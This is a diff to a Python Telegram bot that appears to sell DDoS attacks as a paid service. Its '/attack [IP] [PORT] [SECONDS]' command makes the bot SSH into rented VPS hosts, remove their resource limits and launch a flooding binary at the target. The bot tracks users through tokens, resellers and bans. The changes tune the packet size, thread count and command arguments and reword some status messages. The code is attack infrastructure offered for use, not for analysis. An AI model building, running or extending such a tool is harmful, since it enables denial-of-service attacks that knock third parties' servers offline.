@@ -28,8 +28,8 @@ MONGODB_URIS = [
 DATABASE_NAME = "LUFFY2"  # 🗄️ Replace with your MongoDB database name
 
 # Attack Parameters
-PACKET_SIZE = 677  # 📦 Packet size for attacks
-THREAD = 950  # 🧵 Number of threads
+PACKET_SIZE = 256  # 📦 Packet size for attacks
+THREAD = 677  # 🧵 Number of threads
 BINARY_NAME = "ranbal"  # ⚙️ Binary name
 BINARY_PATH = f"./{BINARY_NAME}"  # 📂 Path to binary on VPS
 
@@ -112,7 +112,7 @@ async def execute_attack_on_vps(task_id, user_id, ip, port, duration, vps):
                 f"ulimit -f unlimited && "
                 f"ulimit -v unlimited && "
                 f"ulimit -s unlimited && "
-                f"{BINARY_PATH} {ip} {port} {duration_seconds} {PACKET_SIZE} {THREAD}"
+                f"{BINARY_PATH} {ip} {port} {duration_seconds} {THREAD}"
             )
             result = await conn.run(command)
             logger.info(f"ulimit and attack output for {vps['ip']}:{vps['port']}: {result.stdout}")  # Log output for debugging
@@ -187,7 +187,7 @@ async def update_attack_timer(update, context, message_id, chat_id, duration_sec
         logger.info(f"🔓 Released {len(vps_list)} VPS for user {chat_id}")
 
 async def check_and_attack_vps(task_id, user_id, ip, port, duration, vps, vps_status_messages, context, chat_id, message_id):
-    """Check binary on a VPS and immediately start attack if binary exists, updating status."""
+    """Check binary on a VPS and immediately start attack if binary exists, or notify and proceed if not found."""
     vps_key = f"{vps['ip']}:{vps['port']}"
     if await check_binary_on_vps(vps):
         logger.info(f"✅ Binary found on VPS {vps_key}, starting attack")
@@ -214,10 +214,10 @@ async def check_and_attack_vps(task_id, user_id, ip, port, duration, vps, vps_st
     else:
         logger.error(f"❌ Binary not found on VPS {vps_key}")
         db = get_mongo_client(user_id)
-        vps_status_messages.append(f"🌐 {vps_key}: Failed (Binary Not Found)")
+        vps_status_messages.append(f"🌐 {vps_key}: Binary Not Found")
         await asyncio.to_thread(db.tasks.update_one, {"_id": ObjectId(task_id)}, {"$set": {f"vps_status.{vps_key}": "failed"}})
         try:
-            # Update the Telegram message to show failure
+            # Update the Telegram message to show binary not found
             await context.bot.edit_message_text(
                 chat_id=chat_id,
                 message_id=message_id,
@@ -295,7 +295,7 @@ async def help(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "━━━━━━━━━━━━━━━━━━━━━━\n"
             "🔫 /attack [IP] [PORT] [SECONDS] - Launch an attack\n"
             "💰 /addtokens [ID] [AMOUNT] - Add tokens\n"
-            "💰 /removetoken [ID] [AMOUNT] - remove tokens\n"
+            "💰 /removetoken [ID] [AMOUNT] - Remove tokens\n"
             "🚫 /ban [ID] - Ban a user\n"
             "✅ /unban [ID] - Unban a user\n"
             "💼 /addreseller [ID] - Add reseller\n"
@@ -320,7 +320,7 @@ async def help(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "━━━━━━━━━━━━━━━━━━━━━━\n"
             "🔫 /attack [IP] [PORT] [SECONDS] - Launch an attack\n"
             "💰 /addtokens [ID] [AMOUNT] - Add tokens\n"
-            "💰 /removetoken [ID] [AMOUNT] - remove tokens\n"
+            "💰 /removetoken [ID] [AMOUNT] - Remove tokens\n"
             "📋 /listusers - List all users\n"
             "━━━━━━━━━━━━━━━━━━━━━━\n"
             f"💻 Bot by @MrRanDom8"
